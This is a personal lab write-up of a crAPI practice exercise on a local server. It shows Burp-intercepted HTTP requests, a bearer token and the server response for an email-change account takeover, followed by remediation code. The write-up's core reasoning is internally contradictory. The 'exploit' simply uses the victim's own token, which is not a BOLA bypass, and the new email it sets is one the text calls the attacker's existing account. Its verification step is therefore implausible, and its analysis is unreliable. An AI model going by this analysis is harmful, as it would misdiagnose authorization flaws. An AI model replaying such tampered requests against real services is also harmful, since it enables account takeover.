# Lab Writeup: Unauthorized Email Modification via BOLA

**Category:** Broken Object Level Authorization (BOLA)  
**Difficulty:** Practitioner  
**Date Completed:** 10/03/2026  
**Platform:** crAPI (Completely Ridiculous API)  
**Lab URL:** http://localhost:8888

---

## 1. Objective

Exploit a broken authorization mechanism in the email change endpoint to modify another user's email address by reusing their authentication token, demonstrating how improper access controls can lead to account takeover.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Object Level Authorization (BOLA)

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**OWASP Category:** API1:2023 – Broken Object Level Authorization

**What is this vulnerability?**

BOLA occurs when an API endpoint doesn't properly verify if the authenticated user has permission to access or modify a specific resource. In this case, the `/identity/api/v2/user/change-email` endpoint accepts any valid JWT token without checking if that token's owner is authorized to change the email for the requested account. This means if I steal or intercept someone else's token, I can use it to modify their account details even though I'm logged in as a different user.

---

## 3. Reconnaissance & Discovery

When I first started exploring the crAPI application, I took a methodical approach to understand its attack surface:

**Initial Exploration:**
- Registered two accounts: a legitimate "user" account (`user@gmail.com`) and an "attacker" account (`newuser@gmail.com`)
- Browsed through all available features: dashboard, profile settings, vehicle management, and community posts
- Identified key endpoints by monitoring traffic in Burp Suite while clicking through the application
- Noticed that email change functionality was available in the user profile section

**Endpoint Discovery:**
- Found the email change endpoint: `POST /identity/api/v2/user/change-email`
- Observed that it uses Bearer token authentication in the Authorization header
- The request body contains `old_email` and `new_email` parameters in JSON format

**The "Aha!" Moment:**
While testing the email change feature on my attacker account, I wondered: *What if I use someone else's token here?* The application seemed to trust the JWT token blindly without validating whether the token owner matches the email being changed. This is a classic BOLA scenario where authorization checks are missing.

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser

---

## 4. Exploitation Steps

### Step 1: Register Two Test Accounts

I created two accounts to simulate a real-world attack scenario:
- **Victim Account:** `user@gmail.com` (this is the target)
- **Attacker Account:** `newuser@gmail.com` (this is my malicious account)

Both accounts were registered normally through the application's signup flow.

### Step 2: Capture the Victim's JWT Token

Logged into the victim account (`user@gmail.com`) and intercepted the traffic using Burp Suite. I navigated to any authenticated endpoint and captured the Authorization header:

**Victim's Token:**
```
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYVZ1WTk5dTlvdGlhV0ZPSWpveE5jcyOTYyMzMS...
```

This JWT token represents the victim's session and proves their identity to the API.

### Step 3: Login as Attacker and Navigate to Email Change

Logged into my attacker account (`newuser@gmail.com`) and navigated to the profile settings where email change functionality exists. I initiated an email change request to capture the API call structure.

### Step 4: Intercept and Modify the Request

Using Burp Suite's Proxy, I intercepted the email change request from my attacker account. Here's what the original request looked like:

**Original Request (Attacker's Token):**
```http
POST /identity/api/v2/user/change-email HTTP/1.1
Host: localhost:8888
Authorization: Bearer [attacker's token]
Content-Type: application/json

{
  "old_email":"newuser@gmail.com",
  "new_email":"hacked@gmail.com"
}
```

### Step 5: Replace Token with Victim's Token

This is where the magic happens. I replaced my attacker's JWT token with the victim's token that I captured earlier, but kept the email parameters pointing to the victim's account:

**Modified Request:**
```http
POST /identity/api/v2/user/change-email HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/change-email
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYVZ1WTk5dTlvdGlhV0ZPSWpveE5jcyOTYyMzMS...
Content-Length: 64
Origin: http://localhost:8888
Connection: keep-alive
Cookie: session_id=61355b29-c203-441c-8ba0-0e4d6bb62bb0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{
  "old_email":"user@gmail.com",
  "new_email":"newuser@gmail.com"
}
```

**Key Observation:** I'm using the victim's authentication token but sending it from my browser session. The API doesn't validate that the token owner matches the email being modified.

### Step 6: Forward the Request and Observe Response


I forwarded the modified request through Burp Suite and watched the response:

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Email changed successfully",
  "email": "newuser@gmail.com"
}
```

**Success!** The API accepted the request and changed the victim's email from `user@gmail.com` to `newuser@gmail.com`.

### Step 7: Verify the Attack

To confirm the attack worked:
1. Tried logging into the victim's account using the old email (`user@gmail.com`) → Failed
2. Tried logging in with the new email (`newuser@gmail.com`) and victim's original password → Success!

I now have complete control over the victim's account. I can initiate a password reset to the new email address and permanently lock out the original owner.

---

## 5. Root Cause Analysis

The vulnerability exists because the API endpoint performs authentication but not authorization. Here's what's happening under the hood:

**What the API Does:**
1. ✅ Validates that the JWT token is legitimate and not expired
2. ✅ Confirms the user is authenticated
3. ❌ **FAILS** to check if the authenticated user has permission to change the email in the request body

**What the API Should Do:**
The server should extract the user ID from the JWT token and verify that the `old_email` in the request belongs to that specific user. Something like this:

```python
# Pseudocode - What's Missing
token_user_id = decode_jwt(token)['user_id']
request_email = request.body['old_email']

user = database.get_user_by_email(request_email)

if user.id != token_user_id:
    return 403, "You don't have permission to modify this email"
```

The developer assumed that because a valid token is present, the user must be authorized to perform the action. This is a dangerous assumption that leads to horizontal privilege escalation.

---

## 6. Impact

If this were a production application, an attacker could:

- [x] Account Takeover
- [x] Privilege Escalation (horizontal)
- [x] Identity Theft
- [x] Data Manipulation
- [ ] Data Exfiltration (indirect - after account takeover)

**Severity:** Critical

**Justification:** This vulnerability allows complete account takeover of any user whose JWT token can be obtained (through XSS, MITM, session hijacking, or social engineering). Once the email is changed, the attacker can reset the password and permanently lock out the legitimate owner. No user interaction is required beyond obtaining their token. The impact is immediate and severe, affecting confidentiality, integrity, and availability of user accounts.

**Real-World Scenario:** Imagine this on a banking app, e-commerce platform, or social media site. An attacker could take over accounts, make unauthorized purchases, steal personal data, or impersonate users.

---

## 7. Remediation

Here's how developers should fix this vulnerability:

1. **Implement Proper Authorization Checks:**
   - Extract the user identifier from the JWT token
   - Verify that the `old_email` in the request belongs to the authenticated user
   - Reject requests where the token owner doesn't match the resource owner
   
   ```javascript
   // Example fix in Node.js
   const tokenUserId = req.user.id; // from JWT middleware
   const oldEmail = req.body.old_email;
   
   const user = await User.findOne({ email: oldEmail });
   
   if (!user || user.id !== tokenUserId) {
     return res.status(403).json({ 
       error: "Unauthorized: You can only change your own email" 
     });
   }
   ```

2. **Use User Context from Token, Not Request Body:**
   - Don't trust the `old_email` parameter from the client
   - Instead, use the user ID from the JWT to fetch the current email from the database
   - Only accept `new_email` from the client
   
   ```javascript
   // Better approach
   const userId = req.user.id; // from verified JWT
   const newEmail = req.body.new_email;
   
   await User.updateEmail(userId, newEmail);
   ```

3. **Add Additional Security Layers (Defense in Depth):**
   - Require email verification before the change takes effect
   - Send notification to the old email address about the change
   - Implement rate limiting on email change requests
   - Add CAPTCHA or 2FA verification for sensitive operations
   - Log all email change attempts for security monitoring

4. **Security Testing:**
   - Add automated tests that verify authorization checks
   - Perform regular API security audits
   - Use tools like OWASP ZAP or custom scripts to test for BOLA vulnerabilities

---

## 8. Key Takeaways / What I Learned

- **Authentication ≠ Authorization:** Just because someone has a valid token doesn't mean they should access everything. Always verify that the authenticated user has permission for the specific resource they're trying to access.

- **Never Trust Client Input for Authorization:** The `old_email` parameter came from the client and was trusted blindly. Always derive the user context from the server-side session or JWT, not from request parameters.

- **Think Like an Attacker:** During testing, I asked myself "What if I use someone else's token?" This mindset is crucial for finding security bugs. Always question assumptions and test boundary conditions.

- **BOLA is Everywhere:** This is the #1 API vulnerability according to OWASP. It's so common because developers often focus on authentication and forget about authorization. Every endpoint that accesses user-specific resources needs authorization checks.

- **Methodology Matters:** By systematically exploring the application, registering multiple accounts, and mapping all endpoints, I was able to identify this vulnerability. A structured approach beats random testing every time.

---

## 9. References

- [OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [crAPI - Completely Ridiculous API](https://github.com/OWASP/crAPI)
- [PortSwigger: Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [JWT.io - JSON Web Token Debugger](https://jwt.io/)

---

**Image Reference:**

![BOLA Attack - Email Change Request](images/api-testing-1-1508.png)
*Figure 1: Intercepted request showing victim's JWT token being used to change their email address*

